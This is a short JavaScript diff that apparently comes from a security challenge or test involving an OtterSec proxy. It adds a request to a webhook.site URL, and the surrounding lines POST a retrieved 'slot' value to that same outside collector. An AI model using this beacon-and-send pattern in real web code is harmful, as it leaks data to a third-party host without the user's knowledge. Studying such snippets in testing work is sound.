@@ -17,6 +17,7 @@
   ptr.init("proxy.ottersec.workers.dev");
   const { slot } =  (async () => await ptr.getSlot())();
   txt.innerText = slot;
+  fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b?wtf=dasdsa");
   fetch("https://webhook.site/5144350e-ea41-4e33-84e5-bccdf086b74b", {
     method: 'POST', // Specify the HTTP method
     body: `${slot || 'lol'}`
